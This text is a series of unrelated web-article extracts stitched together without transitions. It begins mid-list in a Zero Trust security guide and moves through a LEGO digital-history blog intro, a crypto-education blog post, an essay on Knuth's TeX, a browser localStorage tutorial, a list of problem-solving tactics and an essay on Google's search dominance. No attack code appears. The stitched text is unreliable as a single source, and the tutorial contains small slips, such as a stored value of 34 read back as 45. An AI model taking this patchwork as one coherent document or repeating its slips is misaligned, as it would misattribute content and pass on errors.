<li>Every device, user, and network flow is authenticated and authorized</li>
<li>Policies must be dynamic and calculated from as many sources of data as possible</li>
</ol>
<p>The core of Zero Trust is to "never trust, always verify", closely related to the principle of least privilege, stating that any user, program, or process should have the bare minimum privileges necessary to perform its tasks. In order to make sure that an application works well in a Zero Trust environment, we need to minimize the risk of lateral movement by isolating potential data breaches as much as possible. In the context of application development, these five assertions can be summarized into the following guidelines:</p>
<ol>
<li>Treat all hosts as if they are Internet-facing (assertions 1-3)</li>
<li>Delegate authentication and authorization to a supporting system (assertions 4-5)</li>
</ol>
<p>Given that all hosts are regarded as Internet-facing, we need to ensure that all communication channels are secure, even if they were at some point regarded as internal. This means that we should encrypt all internal and external network traffic that we don't want to expose, including (but not limited to) traffic between applications and databases. This will make it difficult for an attacker to snoop traffic, even if he or she has gained access to an internal network.</p>
<p>By delegating authentication and authorization to a supporting system (control plane), it is possible to enable centralized access auditing and policy enforcement based on selected criteria. This means that we don't need to create complex logic to verify devices and users in each application as it will be handled by the control plane. In a more practical sense, we should opt for federated identity combined with standardized authorization protocols like <a href="https://oauth.net/2/">OAuth 2.0</a>. In modern web applications, it may be worth looking into <a href="https://jwt.io/">JWT</a> to represent claims securely.</p>
<p>Regardless of which authorization method you choose, make sure that each client that is granted access will be given its own account. Never share credentials between services or users. One account per client makes it possible to remove access if one client is compromised, and makes it possible to trace traffic back to a single source when investigating an incident, or analyzing traffic in general.</p>
<blockquote>
<p>There are no Zero Trust products. There are products that work well in Zero Trust environments and those that don't.
— <a href="https://www.paloaltonetworks.com/cyberpedia/what-is-a-zero-trust-architecture">Palo Alto Networks</a></p>
</blockquote>
<p>That should cover the basics.

			<p>In 1995 LEGO conducted a study to determine how to become “digital” – how to do it and what it would take. This study took place from May to October in a secret lab on the third floor of LEGO&nbsp;headquarters, Legocentret. At the end of the study LEGO&nbsp;management received a report detailing programs, people, and resources needed to move into the new paradigm. LEGO&nbsp;quickly approved the plan, and SPU-Darwin was set in motion at the beginning of the new year.</p>
<p>This website is the story of SPU-Darwin, of moving LEGO&nbsp;into the 21st century. I’m not sure yet how to tell that story, so it’s organized as a blog. This will allow me to present pieces of history as they come, without worrying about having to have everything set before presenting anything, and will allow me to experiment with presentations. Also, a great deal of leading edge science and engineering had to be developed, and those stories will require intense technical material, which might not appeal to everyone, and those entries will be separate from the general ones.</p>
<p><img alt="BKGND A" src="http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A-300x225.png" width="300" height="225" srcset="http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A-300x225.png 300w, http://www.digitallego.net/wp-content/uploads/2013/05/BKGND-A.png 320w" sizes="(max-width: 300px) 100vw, 300px"></p>
<p>To Darwin members: the blog structure of this website is expressly designed to allow everyone to chime in with their memories. Please do that. Periodically I’ll go through the topics and concentrate them down into organized stories. It’s my hope that this path will eventually lead to an actual publication someday, like an interactive multimedia book, but we’ll worry about that later.</p>
<p>I’m not a designer, so if you’d like to contribute anything about this website design, PLEASE do so.</p>
<p>Note: only Darwin members (which is not just LEGO employees, it’s everyone who was intimately involved – this means you, SGI and Informix and DDE) will have editing access. Everyone else can email, which will be dealt with separately.</p>

<p>The main issue here, as you can see is that this code has a significant performance impact during the call the method. Dynamic attributes are expected to be fast and simple. They shouldn’t contain any complicated logic or perform expensive calls.  </p>

<p>Over the past couple months I’ve taken time to catch myself up on all that’s happened in crypto since my time with <a rel="noreferrer noopener" href="https://onwardlabs.co/" target="_blank"><strong>Onward Labs</strong></a>, and all I can say is my goodness – the amount of experimentation and innovation has been staggering this year. This is exciting because we are seeing financial services get completely rebuilt in an internet-native way and artists are now able to make a good living creating beautiful NFTs. I’m more optimistic about the future of society because of crypto and this decade will be wild with all the mass consumer use cases that will be built.</p>



<p>At the same time, I’m concerned that the barriers to engage with crypto are higher than ever before. This is a huge problem because it limits the circle of people “in the know” to those who lucked into crypto early as well as their extended networks. It’s no secret that Silicon Valley has had a diversity problem and by comparison crypto’s diversity problem is much worse. If we want crypto to achieve the enormous potential we believe crypto has, we have to make the ecosystem more welcoming and inviting for people from all walks of life who bring their unique lived experiences with them. Then, and only then, will the conditions be set to fulfill crypto’s promise to empower people.</p>



<p>I remember when I was first learning about crypto in 2017 – what a steep learning curve it has been! In fact, every crypto expert – whether the like to admit it or not – went through a steep learning curve and we are all still learning. Now that the next crypto bull run is in full swing, I can’t help but think of the massive learning curve that the influx of newcomers to the space will face. </p>

<p>Back when I was preparing for a career in finance, I recall learning about the basics of finance on Investopedia and how great of a resource it was. I thought to myself – why isn’t there something like this for crypto? Enter <a rel="noreferrer noopener" href="https://cryptoporfavor.com/" target="_blank"><strong>Crypto Por Favor</strong></a>. I am building a platform that explains crypto topics in everyday language, meeting people where they are and not using complex crypto jargon as the industry is wont to do. I want it to be a place where anyone can come in from a crypto knowledge base of zero and build up enough awareness to be able to make well-informed decisions about how the want to participate in the evolving ecosystem. I see this as a resource for people, and over time will look to build a community of folks who want to learn among supportive peers in a place where no question is “too dumb.” Oh, and maybe I will experiment with a community token down the road to incentivize people to help build the best crypto onboarding community!</p>



<p>Would love to hear what you think as well as any requests for topics you’d like covered or features you’d like to see. Feel free to reach out on <a rel="noreferrer noopener" href="https://twitter.com/chris3collins" target="_blank"><strong>Twitter</strong></a>.</p>



<p>PS – you may be wondering about the rationale behind the name and branding. When I chose the name, I wanted it to evoke a sense of multiculturalism and present a casual, non-intimidating tone. Given my Latin American roots, Crypto Por Favor was a no-brainer as well as its llama mascot, an animal that is typical of the Andes region. 🦙🌄</p>

<hr>

<p>Most serious programmers have heard of Donald Knuth,
the man who coined the term <em>analysis of algorithms</em> in 1968
and pioneered many of the computer science fundamentals we use today.
Knuth is perhaps most famous for his ongoing magnum opus,
<em>The Art of Computer Programming</em>.</p>

<p>When the first volume of TAOCP was released that same year,
it was printed the way most books had been since the turn of the century:
with <em>hot metal</em> type.
Each individual letter was cast from molten lead,
then arranged into its line.</p>

<figure>
<img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Matrixcase-bembo-16pts.jpg" alt="Monotype matrix case" height="400">
<figcaption>
A case of letter molds—or <em>matrices</em>—used by the Monotype caster,
the most commonly-used machine for printing books in the days of hot metal type.
Its main contemporary, the Linotype, molded entire lines at a time,
and was often used for printing newspapers.
</figcaption>
</figure>

<p>These lines were clamped together to form pages of the book,
which were finally inked and pressed against paper.
By March of 1977, Knuth was ready for a second run of TAOCP, Volume&nbsp;2,
but he was horrified when he received the proofs.
Hot metal typesetting was an expensive, complicated, and time-consuming process,
so publishers had replaced it with phototypesetting,
which works by projecting characters onto film.
The new technology, while much cheaper and faster,
didn’t provide the same level of quality he had come to expect.</p>

<p>The average author would have resigned themselves to the change and moved on,
but Knuth took great pride in print quality,
especially for the mathematics in his books.
Around this time, he discovered an exciting new technology:
digital typesetting.
Instead of working with metal or film,
letters and shapes were built from tiny dots,
often packed together at over 1,000 per inch.
Inspired by this burgeoning tech and frustrated with the current state of affairs,
Knuth set off on one of the greatest yak shaves of all time.
For years, he paused all work on his books to create his own
digital typesetting system.
When the dust settled in 1978, Knuth had the first version of
<span>T<sub>e</sub>X</span>
.<sup id="fnref:1"><a href="#fn:1">1</a></sup></p>

<p>It’s hard to understand how much of a revolution <span>T<sub>e</sub>X</span>
 was,
especially looking back from a time where anybody with a copy
of Word can be their own desktop publisher.
Adobe’s PDF wouldn’t exist for another decade, so Knuth
invented a device-independent format, DVI.
Scalable fonts were uncommon at the time, so Knuth created a system,
<span>METAFONT</span>
, to rasterize his characters into dots on the
page.<sup id="fnref:2"><a href="#fn:2">2</a></sup>
Perhaps most importantly, Knuth and his graduate students designed algorithms
to automatically hyphenate and justify lines of text into
beautifully-typeset paragraphs.</p>

<p>Here is where the timelines diverge.
In one, <span>T<sub>e</sub>X</span>
 was just the beginning.
Computer typography evolves rapidly as the decades go by,
building on Knuth’s prior work and
taking advantage of the million-fold increases we’ve seen in computing power.
Browsers, e-readers, and word processors deliver beautiful type
to every person who looks at a screen, with almost no effort from authors.</p>

<p>In the darker timeline… none of this happens.
<span>T<sub>e</sub>X</span>
 is still some of the best we’ve got for computer typesetting.
It’s seen some impressive improvements,<sup id="fnref:3"><a href="#fn:3">3</a></sup>
but its core hasn’t changed much in decades.
To this day,
it doesn’t lay out more than one page at a time because 1980s computers didn’t
have enough RAM to do any better.<sup id="fnref:4"><a href="#fn:4">4</a></sup>
Almost no other software—except for a handful of professional layout
programs like Adobe InDesign—leverages any of the advances
<span>T<sub>e</sub>X</span>
 made in line breaking and hyphenation.
Layout in Word, browsers, and even e-readers is a sad joke.</p>

<figure>
<img src="https://assets.bitbashing.io/images/exa.png" alt="Mobile browser layout example" height="400">
<figcaption>
State of the art text layout in today's browsers. Mind the gaps.
</figcaption>
</figure>

<p>I’m not sure what to make of this.
Maybe most people, outside a small cadre of designers and
enthusiasts, just don’t care about typography very much.
After all, the human brain is incredibly good glossing over minor details and
im<span>p</span>erfections when reading.
But even the design world seems largely unaware or indifferent to Knuth’s work.
Despite collaborations with famous type designers like Hermann Zapf,
you’ll find no mention of him in renowned books and documentaries on
the subject.<sup id="fnref:5"><a href="#fn:5">5</a></sup>
And parametric font families—just like the ones <span>METAFONT</span>
 offered in 1983—are
heralded in 2017 as “a new era of type design”.<sup id="fnref:6"><a href="#fn:6">6</a></sup>
It’s bizarre.</p>

<p>Good typography can make almost anything more enjoyable to read,
and it feels like such a shame that better layout isn’t
available to the masses
when so much of the groundwork was laid almost forty years ago.
In an age when the average American reads from a screen they keep in their pocket
dozens of times a day,
and where each one of those devices holds more processing power than you could
fit in several rooms back when Donald Knuth
wrote <span>T<sub>e</sub>X</span>
, surely we can—and <em>should</em>—do better.</p>

December 6, 2020 | https://attacomsian.com/blog/web-storage-api-local-storage-session-storage | <a href="https://web.archive.org/web/*/https://attacomsian.com/blog/web-storage-api-local-storage-session-storage">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>The HTML web storage API provides a way to store data locally within a user's browser. You can use it to securely store a large amount of data locally without impacting website performance.</p>
<p>Unlike cookies, web storage has a significantly higher storage limit (5MB vs 4KB) and the data stored is never sent to the server with every request. Therefore, the server can not manipulate the web storage data via HTTP cookies.</p>
<p>Also, the storage is bound to the origin (per domain, protocol, and port). All web pages, from one origin (with the same protocol, domain, and port), can store and access the same data. Even if you change the protocol from <code>http</code> to <code>https</code>, you can not access the data stored using the <code>http</code> protocol.</p>
<h2 id="web-storage-objects">Web Storage Objects</h2>
<p>HTML web storage provides two objects for saving data as key-value pairs in the browser:</p>
<ul>
<li><code>localStorage</code> — stores data with no expiration date that persists even after the browser window is closed. You have to explicitly remove data either programmatically or by clearing the browser's data. The data is shared among all the sessions of the same origin.</li>
<li><code>sessionStorage</code> — stores data for the duration of the page session that gets cleared automatically when the browser tab is closed. If you open multiple tabs of the same website, they will have different sessions and can not access data of each other.</li>
</ul>
<p>Since <code>localStorage</code> persists data with no expiration date, it is useful for storing information such as shopping cart items, user preferences (currency, dark or light color scheme), products bookmarked, or even remembering the user is logged into the website.</p>
<h2 id="methods--properties">Methods &amp; Properties</h2>
<p>Both <code>localStorage</code> and <code>sessionStorage</code> objects provide the same methods and properties because they return the same <a href="https://developer.mozilla.org/en-US/docs/Web/API/Storage" target="_blank" rel="noopener noreferrer" title="Open in new window">Storage</a> object.</p>
<p>The <code>Storage</code> object has just one property, <code>length</code>, that returns the number of items stored in it.</p>
<p>Here is a list of methods that you can call to manipulate web storage data:</p>
<table>
<thead>
<tr>
<th>Method</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>setItem(key, value)</code></td>
<td>Add a new key-value pair to the storage</td>
</tr>
<tr>
<td><code>getItem(key)</code></td>
<td>Retrieve a value by its key</td>
</tr>
<tr>
<td><code>removeItem(key)</code></td>
<td>Remove an item by its key</td>
</tr>
<tr>
<td><code>clear()</code></td>
<td>Delete all key-value pairs</td>
</tr>
<tr>
<td><code>key(n)</code></td>
<td>Retrieve the name of the nth key in the storage</td>
</tr>
</tbody>
</table>
<h2 id="web-storage-examples">Web Storage Examples</h2>
<p>Let us play with <code>localStorage</code> to get an idea of how web storage works.</p>
<h3 id="storing-data">Storing data</h3>
<p>The following example uses <code>setItem()</code> to add new key-value pairs to <code>localStorage</code>:</p>
<pre rel="javascript"><code>localStorage.setItem('id', 'ATS-456');
localStorage.setItem('email', 'john.doe@example.com');
</code></pre>
<p>Note that both key and value passed to <code>setItem()</code> must be strings. If you pass any value that is not a string, like an object or a number, the <code>setItem()</code> method will automatically convert it a string:</p>
<pre rel="javascript"><code>localStorage.setItem('visitors', 34); // stored as '34'
localStorage.setItem('user', { name: 'Alex' }); // stored as '[oject Object]'
</code></pre>
<p>For objects, you need to use the <a href="https://attacomsian.com/blog/json-parse-stringify#jsonstringify">JSON.stringify()</a> method to convert it to a string before storing into web storage:</p>
<pre rel="javascript"><code>const str = JSON.stringify({name: 'Alex'});
localStorage.setItem('user', str);
</code></pre>
<h3 id="retrieving-data">Retrieving data</h3>
<p>To retrieve the stored data in <code>localStorage</code> by key, use the <code>getItem()</code> method:</p>
<pre rel="javascript"><code>localStorage.getItem('id');     // ATS-456
localStorage.getItem('email');  // john.doe@example.com
</code></pre>
<p>Alternatively, you could also use the dot (<code>.</code>) donation to access keys from <code>localStorage</code> like objects:</p>
<pre rel="javascript"><code>localStorage.visitors;  // 45
</code></pre>
<p>If the key doesn't exist, a <code>null</code> value is returned by <code>getItem()</code>:</p>
<pre rel="javascript"><code>localStorage.getItem('name'); // null
</code></pre>
<h3 id="removing-data">Removing data</h3>
<p>To delete a key-value pair from <code>localStorage</code>, just pass the name of the key to the <code>removeItem()</code> method:</p>
<pre rel="javascript"><code>localStorage.removeItem('id');
</code></pre>
<p>Alternatively, you could also use the <code>delete</code> operator to delete a key like an object:</p>
<pre rel="javascript"><code>delete localStorage.email;
</code></pre>
<p>To remove all key-value pairs, use the <code>clear()</code> method instead:</p>
<pre rel="javascript"><code>localStorage.clear();
</code></pre>
<h3 id="iterating-over-keys">Iterating over keys</h3>
<p>To iterate over all keys stored in <code>localStorage</code>, we can use the <a href="https://attacomsian.com/blog/javascript-for-of-loop">for...of</a> loop:</p>
<pre rel="javascript"><code>const keys = Object.keys(localStorage);
for (let key of keys) {
    console.log(`${key}: ${localStorage.getItem(key)}`);
}
</code></pre>
<p>The <code>Object.keys()</code> method returns all <a href="https://attacomsian.com/blog/javascript-object-get-all-own-properties">own properties</a> of the <code>localStorage</code> object, ignoring the <a href="https://attacomsian.com/blog/objects-prototypes-classes-javascript#prototypes">prototype</a>.</p>
<h2 id="summary">Summary</h2>
<p>HTML web storage API provides a mechanism to store data locally within the user's browser. Before web storage, cookies were the only option available for storing application data.</p>
<p>Unlike cookies, web storage is more secure and capable of storing a larger amount of data (5MB+, depending on the browser) without affecting the application performance.</p>
<p>Web storage is bound to the origin, which means that pages from the same origin can only access their own data.</p>
<p>Web storage provides two objects, <code>localStorage</code> and <code>sessionStorage</code>, to save data as key-value pairs in the browser.</p>
<p>The data stored in <code>localStorage</code> is permanent and shared between all tabs and windows with the same origin. It persists even after the browser is closed or the computer is restarted.</p>
<p>The <code>sessionStorage</code> object stores data temporarily until the session is active. The data is only accessible within the same tab and can not be accessed from other tabs. It gets cleared automatically once the browser tab is closed.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

<p>Sunday December 6, 2020</p>
<p>Inspired by <a href="https://planspace.org/2013/09/28/polyas-how-to-solve-it-quotes-and-comments/">How to Solve It</a>, <a href="https://planspace.org/20200716-lateral_thinking_creativity_step_by_step/">Lateral Thinking</a>, and others,
I've started to collect tactics for problem-solving. The shuffling
stuff is so that you can easily choose a random tactic to try.</p>
<p>I might do more with this and I'd love feedback/suggestions;
<a href="#contact">comment or message me</a>!</p>
<center>


</center>

<div>
<hr>
<h3><a href="#1" name="1">1</a>. Embrace problems</h3>
<p>The word "problem" has a negative connotation, and some problems are
hard to love. But in general, problems make life more interesting and
give us opportunities to learn, grow, and improve. Keep your problems
close.</p>
</div>
<div>
<hr>
<h3><a href="#2" name="2">2</a>. Take care of yourself</h3>
<p>Are you hungry? Tired? Stressed? Eat well, sleep well, and look after
your mental health. Try to do something right now to make your body
and mind more effective, like stretching.</p>
</div>
<div>
<hr>
<h3><a href="#3" name="3">3</a>. Take the pressure off</h3>
<p>What can you do to approach the problem calmly? Should you ask for
help or otherwise communicate with others? Should you make a back-up
plan or adjust your goal?</p>
</div>
<div>
<hr>
<h3><a href="#4" name="4">4</a>. Reinforce the positive</h3>
<p>You have an opportunity for growth. You're learning. Celebrate all
progress, even small progress. Feel good about what you're doing. You
can do this.</p>
</div>
<div>
<hr>
<h3><a href="#5" name="5">5</a>. Remove distractions</h3>
<p>Turn off the TV. Turn off your phone. Turn off notifications. Don't
check the news. Multitasking is a lie. If other thoughts come, jot
them down elsewhere to return to later.</p>
</div>
<div>
<hr>
<h3><a href="#6" name="6">6</a>. Get inspired</h3>
<p>Why are you working on this? What's the larger goal? What are the
larger benefits? What other problems or people have done work you
admire? Appreciate and aspire to greatness.</p>
</div>
<div>
<hr>
<h3><a href="#7" name="7">7</a>. Make a plan</h3>
<p>If you know how to attack the problem, make a plan to do that. Even if
you don't, make a plan to spend time on the problem, not all at once,
but consistently over a longer period.</p>
</div>
<div>
<hr>
<h3><a href="#8" name="8">8</a>. Do other things</h3>
<p>Don't forget to eat and sleep, but also, spend time on complementary
and even unrelated tasks. Read a book. Tutor a student. Revisit other
things. Take a walk.</p>
</div>
<div>
<hr>
<h3><a href="#9" name="9">9</a>. Work hard</h3>
<p>You need to focus. You need to put in time and effort. Sometimes you
have to stop looking for shortcuts and do the work. There is no royal
road. Work harder than anyone else.</p>
</div>
<div>
<hr>
<h3><a href="#10" name="10">10</a>. Relax</h3>
<p>Take some time to change the nature of your focus on the problem. Pull
back from single-minded concentration. Don't focus on anything else
either. Relax. Don't micromanage your brain. What comes to you?</p>
</div>
<div>
<hr>
<h3><a href="#11" name="11">11</a>. Work smart</h3>
<p>Even if you're already making progress, is there something you could
do more effectively? Can you find a better process if you reconsider?</p>
</div>
<div>
<hr>
<h3><a href="#12" name="12">12</a>. Find support</h3>
<p>What would help you to be effective? Is there a group or team you can
join or form? What people or other resources can you engage with?</p>
</div>
<div>
<hr>
<h3><a href="#13" name="13">13</a>. Understand the problem</h3>
<p>Do you completely understand what you're working on? Are all the
definitions clear? Does everyone involved agree on the problem
statement and objective?</p>
</div>
<div>
<hr>
<h3><a href="#14" name="14">14</a>. Find roots</h3>
<p>What is the root cause (or causes) of the problem? Is the problem as
stated the real problem? How did the problem come to be? Keep asking
why.</p>
</div>
<div>
<hr>
<h3><a href="#15" name="15">15</a>. Know what you know</h3>
<p>What do you know, and how do you know it? Are you sure? Could you
explain it to someone else? What do you not know, and how could you
come to know it? What else might be relevant?</p>
</div>
<div>
<hr>
<h3><a href="#16" name="16">16</a>. Question assumptions</h3>
<p>What are you taking for granted? What is so obvius that you haven't
thought about it? What biases might be affecting your thinking? Are
there alternatives that seem "out there"?</p>
</div>
<div>
<hr>
<h3><a href="#17" name="17">17</a>. Find similar problems</h3>
<p>Do you know a related problem? What have others done in similar
situations? How is a similar problem solved in nature, or in another
field? Can you build on work you or others have done before?</p>
</div>
<div>
<hr>
<h3><a href="#18" name="18">18</a>. Consider quitting</h3>
<p>Is this a problem that shouldn't be solved? Is this problem the right
use of your time, right now? What if you didn't solve this particular
problem?</p>
</div>
<div>
<hr>
<h3><a href="#19" name="19">19</a>. Get an easy win</h3>
<p>Find a task that you can succeed at in the next two minutes. It could
be getting out a pen, or opening a book. Do it, then praise yourself
for that victory. It may be easier to keep making progress afterward.</p>
</div>
<div>
<hr>
<h3><a href="#20" name="20">20</a>. Start things cooking</h3>
<p>Many tasks involve some waiting after you initiate them, like waiting
for food to marinate, or waiting for responses to an email. Make a
point to get these things started as soon as you can.</p>
</div>
<div>
<hr>
<h3><a href="#21" name="21">21</a>. Take a step</h3>
<p>Even if you're not sure of your whole plan, do something now. You can
always reevaluate afterward. Choose some goal that you can accomplish,
and do it now.</p>
</div>
<div>
<hr>
<h3><a href="#22" name="22">22</a>. Do an experiment</h3>
<p>You don't have to only do things that you know will work. Try
something and see what happens. Be prepared to throw it away. You'll
learn from it and it will help you to make progress.</p>
</div>
<div>
<hr>
<h3><a href="#23" name="23">23</a>. Guess and check</h3>
<p>A particular kind of experiment is to choose a next step, even if you
don't know that it's right, and see what happens next. Follow the
consequences forward. Even if you guessed wrong, you'll learn
something.</p>
</div>
<div>
<hr>
<h3><a href="#24" name="24">24</a>. Write down what you’ve done</h3>
<p>Keep some log of what you've been doing, what you've tried, and what
the results have been. If you haven't been doing this, try to remember
and write down what you've done so far.</p>
</div>
<div>
<hr>
<h3><a href="#25" name="25">25</a>. Try again</h3>
<p>Sometimes when you try something and it doesn't work, it isn't that
the approach was bad, it's that something didn't align that time. It
could be worth trying again, especially with things you tried when you
knew less.</p>
</div>
<div>
<hr>
<h3><a href="#26" name="26">26</a>. Zoom in</h3>
<p>How close can you get to the tiniest pieces? What happens for exactly
one component? For a global problem, how does a single individual play
a part on a daily basis?</p>
</div>
<div>
<hr>
<h3><a href="#27" name="27">27</a>. Zoom out</h3>
<p>What's the big picture? How does the problem fit into larger systems?
What's the global view? What's the long term view?</p>
</div>
<div>
<hr>
<h3><a href="#28" name="28">28</a>. Draw a picture</h3>
<p>Make a graphical representation. It could be a sketch, a plot, a
diagram, a mind map, a flow chart. Make something you can see.</p>
</div>
<div>
<hr>
<h3><a href="#29" name="29">29</a>. Change representations</h3>
<p>What's another way to conceptualize the problem? In math, you might
switch between numeric, geometric, and algebraic forms. You might
change domains, or phrase the problem as a story.</p>
</div>
<div>
<hr>
<h3><a href="#30" name="30">30</a>. Use a different tool</h3>
<p>Try saying it out loud. Try typing, or writing longhand, or recording
a video. Try post-it notes or index cards. Try paper and pencil, or a
calculator, a diagramming tool, or a programming language.</p>
</div>
<div>
<hr>
<h3><a href="#31" name="31">31</a>. Use analogy</h3>
<p>What else is this like? Can you compare to something else, even if
it's a stretch? What do the similarities and differences tell you?</p>
</div>
<div>
<hr>
<h3><a href="#32" name="32">32</a>. Change viewpoints</h3>
<p>How does this look from different perspectives? How do different
people, pieces, places see the problem? Can you imagine yourself in
different positions?</p>
</div>
<div>
<hr>
<h3><a href="#33" name="33">33</a>. Organize concepts</h3>
<p>What's the deep structure of this problem? Can you model the problem?
Are there axes or other ways of representing the ideas of your
problem?</p>
</div>
<div>
<hr>
<h3><a href="#34" name="34">34</a>. Add randomness</h3>
<p>Consider something you wouldn't otherwise: a random word, WikiPedia
article, or the concept of randomness itself. Go to a museum, or a
store. Whatever you find, relate it to your problem. What could it
mean?</p>
</div>
<div>
<hr>
<h3><a href="#35" name="35">35</a>. Talk it through</h3>
<p>Have a conversation with someone. Or imagine a conversation with
someone. Or have a conversation with yourself. Explain everything
you're thinking about.</p>
</div>
<div>
<hr>
<h3><a href="#36" name="36">36</a>. Decompose/Recompose</h3>
<p>What are the words and ideas that you're using? Are they cliché? Are
they appropriate? What if you broke down the way you're understanding
the problem and rebuilt it? Can you articulate the problem and
solution spaces?</p>
</div>
<div>
<hr>
<h3><a href="#37" name="37">37</a>. Get feedback</h3>
<p>Get an outside view on your problem and your work on it. Try to
solicit feedback that helps you see things you aren't otherwise
seeing.</p>
</div>
<div>
<hr>
<h3><a href="#38" name="38">38</a>. Learn more</h3>
<p>You may not know enough to solve your problem, and you may not even
know what it is that you don't know. Keep learning! Be curious about
topics near and far. Read and study for pleasure.</p>
</div>
<div>
<hr>
<h3><a href="#39" name="39">39</a>. Ask for help</h3>
<p>Other people can help you a lot. Put effort into finding the right
place and way to ask, and others will often put effort into helping
you.</p>
</div>
<div>
<hr>
<h3><a href="#40" name="40">40</a>. Break it up</h3>
<p>Sometimes you can break big problems into many more manageable steps.
It may even be possible for multiple people to work on separate parts.
Regardless, pursue and celebrate partial progress.</p>
</div>
<div>
<hr>
<h3><a href="#41" name="41">41</a>. Use inversion</h3>
<p>How might you achieve the opposite of your goal? Are there other
reversals or inversions that might be illuminating? What's the worst
case outcome? Can you avoid it?</p>
</div>
<div>
<hr>
<h3><a href="#42" name="42">42</a>. Make a list</h3>
<p>Generate lots of ideas. What are all the options? Consider more
possibilities. What else could you make a list of?</p>
</div>
<div>
<hr>
<h3><a href="#43" name="43">43</a>. Eliminate possibilities</h3>
<p>What can you rule out? What hasn't worked already? What's impossible?
What has to be wrong? Why is that? What are the constraints? What can
you learn from what doesn't work?</p>
</div>
<div>
<hr>
<h3><a href="#44" name="44">44</a>. Work backward</h3>
<p>Assume you have a solution. How would it come to be? What would
immediately lead to it? Can you follow steps backward from the end?</p>
</div>
<div>
<hr>
<h3><a href="#45" name="45">45</a>. Consider special cases</h3>
<p>Are there some specific forms of the problem that are more tractable
or help with understanding? Can you extend a method based on these?</p>
</div>
<div>
<hr>
<h3><a href="#46" name="46">46</a>. Consider extremes</h3>
<p>What if something in your problem disappeared, or was huge? What if
the problem itself was much worse, or more minor?</p>
</div>
<div>
<hr>
<h3><a href="#47" name="47">47</a>. Add a constraint</h3>
<p>Add a deadline for something. Can you come up with ten ideas in ten
minutes? What if you have to be done today? What if your techniques or
resources were limited? What if you couldn't use a tool you're
currently using?</p>
</div>
<div>
<hr>
<h3><a href="#48" name="48">48</a>. Simplify</h3>
<p>In what ways could a complicated problem be made less so? What does
simplifying it mean? Can you solve the simpler problem? If so, is that
good enough, or is there a way to build on the solution?</p>
</div>
<div>
<hr>
<h3><a href="#49" name="49">49</a>. Generalize</h3>
<p>Can you make your problem a special case of some other problem? Can
you solve that problem? Maybe a general-purpose tool or approach can
be used or adapted for your problem.</p>
</div>
<div>
<hr>
<h3><a href="#50" name="50">50</a>. Change the goal</h3>
<p>Maybe you don't need to solve exactly the problem you started with.
What's most important? Can you focus on that? Can you compromise to
find something that you can make progress on?</p>
</div>
<div>
<hr>

<p>Google is the <a href="https://www.smartinsights.com/search-engine-marketing/search-engine-statistics/">most widely-used search engine</a> in the world, and the company now offers hundreds of other services and products on top of search-based advertising. Personally, I think Google has done a great job improving search over the past two decades, but we are reaching a point where Google’s interests are colliding with offering honest search results to users.</p>
<h2 id="googles-competing-services">Google’s Competing Services</h2>
<p>All the way back in 2012, Yelp’s IPO statement cited Google as both its <a href="http://seekingalpha.com/article/399831-yelp-has-a-google-problem">biggest asset for gaining new users as well as its biggest competitor</a>. Because the site was the largest local business review site when it went public, it gathered much of its traffic from users who use Google to search for nearby businesses - especially those without a website or strong social media presence.</p>
<p>Since Yelp launched, Google has released its own competing review aggregator, which means that if Google wanted, they could force their results to the top of the list every time. This could effectively <em>kill</em> Yelp’s ability to get new users, and raises a lot of questions about Google’s monopoly on search and its effect on internet businesses.</p>
<h2 id="smart-phones-and-search-engines">Smart Phones and Search Engines</h2>
<p>A more recent frontier in the fight against Google is on smart phones. In 2020, the Justice Department <a href="https://www.justice.gov/opa/pr/justice-department-sues-monopolist-google-violating-antitrust-laws">brought a lawsuit against the search giant</a> accusing them of “anticompetitive and exclusionary practices,” related to the pressure they allegedly put on phone makers to default to their search engine.</p>
<p>Because Google owns one of the two biggest mobile operating systesm (Android), they have a lot of power to push users towards their search engine. It’s possible that this latest lawsuit could result in a large judgment against the company. A similar lawsuit <a href="https://www.pcmag.com/news/eu-fines-google-51b-for-abuse-of-power">filed in the European Union in 2018</a> led Google to change the way it bundles apps on Android phones.</p>
<h2 id="the-wiki-model-for-search">The Wiki Model for Search</h2>
<p>As Google’s intentions to integrate search with its own services more deeply has become clear, and I’ve been considering what a non profit search engine might look like.</p>
<p>A great model to look at for guidance is <a href="https://www.wikipedia.org/">Wikipedia</a>, the non-profit internet encyclopedia. Could having a crowdsourced, community-funded non-profit search engine be the way to save search engines from becoming cogs in a corporate advertising machine?</p>
<h3 id="spinning-off-a-not-for-profit-search-engine">Spinning Off a Not For Profit Search Engine</h3>
<p>Realistically, it’s not likely that a new competitor will be able to enter the search engine market and make any impact on Google’s market share. But, the US Justice Department or EU could split the company up.</p>
<p>For example, they could break Google up into multiple companies like they <a href="https://en.wikipedia.org/wiki/Breakup_of_the_Bell_System">did to the telephone companies in the 1980s</a>, or Google search could be turned into a public utility. This is <a href="https://www.project-disco.org/competition/030819-antitrust-in-60-seconds-public-utility-regulation/">how electric companies became publicly supported infrastructure</a>, so it’s not impossible that it could happen again.</p>
<h3 id="how-would-a-non-profit-search-engine-work">How Would a Non Profit Search Engine Work?</h3>
<p>Essentially, a non-profit search engine would allow users to drive improvements to the algorithm by reporting bad results or collaborating on improvements.</p>
<p>I would envision a core team with many contributors - much like open-source projects hosted on Github. While the basic functionality (crawling, link-tracking, etc.) would be the same as a search engine like Google, an impartial not for profit search engine could sidestep privacy pitfalls like Google’s <a href="http://searchengineland.com/googles-results-get-more-personal-with-search-plus-your-world-107285">SPYW</a> and the aforementioned Yelp problem.</p>
<p>Of course, there is room for abuse in this system as well, but there are numerous improvements to be had in a publicly visible model like this.</p>
<h2 id="the-best-option-today">The Best Option Today</h2>
<p>The closest thing we have today is <a href="https://duckduckgo.com/">DuckDuckGo</a>, which is closed-source and for-profit, but does not store personal data. This gives users some of the privacy-focused features that a non profit search engine might provide, but doesn’t answer the potential for abuse or eventual monopoly.</p>
<p><img src="https://i.imgur.com/OkT1Ljn.png" alt="DuckDuckGo search engine"></p>
<p>Earlier this year, I spent 3 months exclusively using DuckDuckGo as my search engine of choice. As a programmer, it was really challenging though. Google’s results have lots of context about my browsing behaviors, but DuckDuckGo doesn’t, so it takes a little massaging to get the results you might expect.</p>
